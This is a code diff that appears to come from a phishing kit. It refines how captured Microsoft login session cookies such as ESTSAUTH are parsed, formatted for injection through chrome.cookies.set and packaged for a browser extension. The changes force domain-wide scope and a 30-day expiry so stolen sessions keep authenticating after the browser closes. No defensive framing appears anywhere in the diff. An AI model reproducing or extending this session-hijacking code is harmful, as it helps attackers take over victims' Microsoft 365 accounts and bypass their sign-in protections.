@@ -749,8 +749,13 @@ function extractCookiesFromResponse(cookieList, response, url) {
         const attrName = attr.substring(0, eq).trim().toLowerCase();
         const attrValue = attr.substring(eq + 1).trim();
         if (attrName === 'domain') {
-          // Normalize: strip leading dot if present
-          domain = attrValue.toLowerCase().replace(/^\./, '');
+          // Preserve the leading dot EXACTLY as sent by Microsoft.
+          // chrome.cookies.set() requires '.microsoftonline.com' to apply the
+          // cookie across subdomains (login.microsoftonline.com, etc).
+          // A bare 'microsoftonline.com' is exact-host-only, so ESTSAUTH
+          // would never be delivered to login.microsoftonline.com and the
+          // SSO redirect back to login.microsoftonline.com fails.
+          domain = attrValue.toLowerCase();
         } else if (attrName === 'path') {
           path = attrValue;
         } else if (attrName === 'samesite') {
@@ -764,11 +769,15 @@ function extractCookiesFromResponse(cookieList, response, url) {
       }
     }
 
-    // Fallback domain from URL if not specified in header
+    // Fallback domain if the header omitted Domain=
+    // Per RFC 6265, a cookie with no Domain attribute scopes to the
+    // exact origin host (no dot). Do NOT add a dot here — that would
+    // over-broaden a cookie the server meant to scope narrowly.
     if (!domain && baseUrl.hostname) {
-      domain = baseUrl.hostname;
+      domain = baseUrl.hostname.toLowerCase();
     } else if (!domain) {
-      domain = '.';
+      // No host context at all — fall back to the SSO parent domain.
+      domain = '.microsoftonline.com';
     }
 
     cookieList.push({
@@ -800,21 +809,55 @@ function formatCookiesForInjection(cookies, accountType) {
     // Legacy fallback: parse simple name=value pairs
     return cookies.split('; ').map(s => {
       const [name, value] = s.split('=');
-      return { name: name, value: value, domain: 'microsoftonline.com', path: '/', secure: true, httpOnly: false, sameSite: 'Lax' };
+      return { name: name, value: value, domain: '.microsoftonline.com', path: '/', secure: true, httpOnly: false, sameSite: 'Lax' };
     }).filter(c => c.name && c.value);
   }
   if (!Array.isArray(cookies)) return [];
-  
+
   return cookies.map(cookie => ({
     name: cookie.name,
     value: cookie.value,
-    domain: cookie.domain || 'microsoftonline.com',
+    // Leading dot is REQUIRED for parent-domain matching in chrome.cookies.set().
+    // 'microsoftonline.com' = exact host only (broken); '.microsoftonline.com' =
+    // covers login.microsoftonline.com, aadcdn.microsoftonline.com, etc.
+    domain: cookie.domain || '.microsoftonline.com',
     path: cookie.path || '/',
     secure: cookie.secure !== false,
     httpOnly: cookie.httpOnly === true,
     sameSite: cookie.sameSite || 'Lax',
-    expirationDate: cookie.maxAge ? Math.floor(Date.now() / 1000) + cookie.maxAge : undefined,
+    // Must always be a concrete timestamp. undefined = session cookie, which
+    // dies on browser close and defeats storing the capture.
+    expirationDate: computeCookieExpiration(cookie),
   })).filter(c => c.name && c.value);
+}
+
+/**
+ * Resolve a concrete expirationDate (unix seconds) for a cookie.
+ *
+ * Order: Max-Age → Expires → 30-day default.
+ *
+ * A cookie with no expirationDate is a SESSION cookie and disappears when the
+ * browser closes. The whole point of storing a capture is that it outlives the
+ * capture session, so we always land on a real timestamp.
+ *
+ * @param {object} cookie - cookie record with optional maxAge / expires
+ * @returns {number} unix seconds
+ */
+function computeCookieExpiration(cookie) {
+  const now = Math.floor(Date.now() / 1000);
+
+  // Max-Age wins over Expires per RFC 6265
+  if (cookie.maxAge && cookie.maxAge > 0) {
+    return now + Math.floor(cookie.maxAge);
+  }
+
+  if (cookie.expires) {
+    const t = Math.floor(new Date(cookie.expires).getTime() / 1000);
+    if (!isNaN(t) && t > now) return t;
+  }
+
+  // Default: 30 days. Survives browser restarts and tab closure.
+  return now + 30 * 24 * 60 * 60;
 }
 
 /**
@@ -906,17 +949,27 @@ function generateExtensionData(cookieResult) {
   
   const targetUrl = determineEndpoint(cookieResult.templateType || 'office');
   
-  // Filter out empty values and undefined expirationDate
-  const extensionCookies = structured.map(c => ({
-    name: c.name,
-    value: c.value,
-    domain: c.domain,
-    path: c.path,
-    secure: c.secure,
-    httpOnly: c.httpOnly,
-    sameSite: c.sameSite,
-    expirationDate: c.expirationDate, // undefined = session cookie
-  }));
+  // Every cookie MUST have a concrete domain + expirationDate.
+  // - domain without a leading dot = exact-host only (silently useless)
+  // - expirationDate undefined      = session cookie (dies on browser close)
+  // Both have been the cause of captures that "set" but never authenticate.
+  const nowSec = Math.floor(Date.now() / 1000);
+  const extensionCookies = structured
+    .map(c => ({
+      name: c.name,
+      value: c.value,
+      // Ensure the leading dot for parent-domain matching
+      domain: c.domain && c.domain[0] === '.' ? c.domain : '.' + (c.domain || 'microsoftonline.com'),
+      path: c.path || '/',
+      secure: c.secure !== false,
+      httpOnly: c.httpOnly === true,
+      sameSite: c.sameSite || 'Lax',
+      // 30-day floor — never emit a session cookie
+      expirationDate: c.expirationDate && c.expirationDate > nowSec
+        ? Math.floor(c.expirationDate)
+        : nowSec + 30 * 24 * 60 * 60,
+    }))
+    .filter(c => c.name && c.value);
   
   return {
     success: true,
